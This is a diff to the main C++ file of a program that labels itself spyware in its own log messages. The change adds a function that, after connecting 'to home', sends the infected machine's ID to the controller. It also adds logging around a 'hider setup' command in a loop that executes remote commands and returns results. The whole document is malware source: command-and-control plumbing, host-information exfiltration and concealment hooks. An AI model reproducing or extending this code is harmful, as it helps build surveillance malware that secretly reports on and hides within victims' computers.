@@ -1,16 +1,21 @@
 #include <iostream>
 
 #include "../Maneger/Connection.h"
+#include "../Maneger/SocketConnection.h"
+
 #include "../IncludeCPP/Status.h"
 
 #include "../Maneger/HiderManeger.h"
 #include "../Hider/HiderCodes.h"
 #include "../Maneger/Listener.h"
 #include "../Maneger/Connection.h"
-#include "../Maneger/SocketConnection.h"
 #include "contrapMeta.h"
 #include "Contraption.h"
 #include "ContraptionAdmin.h"
+#include "../IncludeCPP/getBasicInfo.h"
+
+int initRun(std::shared_ptr<Connection> conn);
+
 
 #define PORT (65410)
 
@@ -43,6 +48,19 @@ int main() {
 }
 
 
+// perform stuff after connection to home creation
+// meant for sending information required for operation
+int initRun(std::shared_ptr<Connection> conn) {
+
+
+    if (conn->sendString(getMachineID(), true) == false) {
+        std::cerr << "error sending machine id" << std::endl;
+        exit(EXIT_FAILURE);
+    }
+
+    return 0;
+}
+
 
 void loopIter(std::shared_ptr<SocketConnection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin)
 {
@@ -68,7 +86,9 @@ void loopIter(std::shared_ptr<SocketConnection> conn, HiderManeger& hiderManeger
         std::exit(EXIT_SUCCESS);
     
     case HIDER_SETUP:
+        std::cerr << "start  hider setup\n";
         stat = hiderManeger.setUpHider(cmd.strParam);
+        std::cerr << "finnsh  hider setup\n";
         break;
     }
 
@@ -77,7 +97,7 @@ void loopIter(std::shared_ptr<SocketConnection> conn, HiderManeger& hiderManeger
     }
 
     conn->flushInput();
-    std::cerr << "Spyware:  Conn: res-" << stat << " response-\n" << strRes << std::endl;
+    std::cerr << "Spyware:  Conn: res-" << stat << "\nresponse-" << strRes << std::endl;
     conn->sendResponce(stat, strRes);
     std::cerr << "Spyware: responce sent" << std::endl;
 }
